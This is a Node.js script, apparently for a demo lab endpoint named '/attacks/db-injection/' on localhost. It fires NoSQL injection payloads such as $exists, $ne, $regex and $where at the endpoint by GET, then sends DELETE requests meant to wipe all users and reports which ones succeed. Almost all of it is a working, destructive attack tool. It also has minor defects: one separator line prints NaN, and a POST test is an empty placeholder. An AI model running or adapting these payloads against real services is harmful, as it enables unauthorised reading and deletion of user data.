#!/usr/bin/env node

const http = require("http");
const https = require("https");

const BASE_URL = process.env.BASE_URL || "http://localhost:3000";

const makeRequest = (method, path, data = null) => {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method,
      headers: {
        "Content-Type": "application/json",
      },
    };

    // Add Content-Length header for requests with data
    if (data) {
      const dataString = JSON.stringify(data);
      options.headers["Content-Length"] = Buffer.byteLength(dataString);
    }

    const req = (url.protocol === "https:" ? https : http).request(
      options,
      (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => {
          try {
            const parsed = JSON.parse(body);
            resolve({ status: res.statusCode, data: parsed });
          } catch (e) {
            resolve({ status: res.statusCode, data: body });
          }
        });
      }
    );

    req.on("error", reject);

    if (data) {
      req.write(JSON.stringify(data));
    }

    req.end();
  });
};

const dbInjectionAttack = async () => {
  console.log("💉 Starting Database Injection Attack...");
  console.log(`📍 Target: ${BASE_URL}/attacks/db-injection/`);
  console.log("=" * 50);

  // Test different injection payloads
  const injectionPayloads = [
    // NoSQL injection to delete all users
    { name: { $exists: true } },
    // NoSQL injection to find users with specific conditions
    { name: { $ne: null } },
    // NoSQL injection to find users with regex
    { name: { $regex: ".*" } },
    // JavaScript injection (dangerous!)
    { name: { $where: "function() { return true; }" } },
    // Array injection
    { name: { $in: ["admin", "user", "test"] } },
    // Logical operators
    { name: { $or: [{ $exists: true }, { $ne: null }] } },
  ];

  console.log("🔍 Testing various injection payloads...\n");

  for (let i = 0; i < injectionPayloads.length; i++) {
    const payload = injectionPayloads[i];
    console.log(`📝 Testing payload ${i + 1}: ${JSON.stringify(payload)}`);

    try {
      // Test GET injection
      const getResult = await makeRequest(
        "GET",
        `/attacks/db-injection/?${encodeURIComponent(JSON.stringify(payload))}`
      );
      console.log(
        `   GET response: ${getResult.status} - ${JSON.stringify(
          getResult.data
        ).substring(0, 100)}...`
      );

      // Test POST injection

      console.log("");
    } catch (error) {
      console.log(`   ❌ Error: ${error.message}`);
      console.log("");
    }
  }

  // Test specific dangerous payloads
  console.log("🚨 Testing dangerous payloads...\n");

  const dangerousPayloads = [
    // This could potentially delete all users
    { name: { $exists: true } },
    // This could potentially find all users
    { name: { $regex: ".*" } },
  ];

  for (const payload of dangerousPayloads) {
    try {
      console.log(`💀 Testing dangerous payload: ${JSON.stringify(payload)}`);

      const result = await makeRequest(
        "DELETE",
        "/attacks/db-injection/",
        payload
      );

      if (result.status === 200) {
        console.log(
          `   ✅ SUCCESS! Injection worked with status: ${result.status}`
        );
        console.log(`   📊 Response: ${JSON.stringify(result.data)}`);
      } else {
        console.log(`   ❌ Injection failed with status: ${result.status}`);
      }

      console.log("");
    } catch (error) {
      console.log(`   ❌ Error: ${error.message}`);
      console.log("");
    }
  }

  console.log("=".repeat(50));
  console.log("🎯 Database injection attack completed!");
  console.log(
    "⚠️  Check the responses above to see which injections were successful."
  );

  return true;
};

// Run if called directly
if (require.main === module) {
  dbInjectionAttack().catch(console.error);
}

module.exports = { dbInjectionAttack };
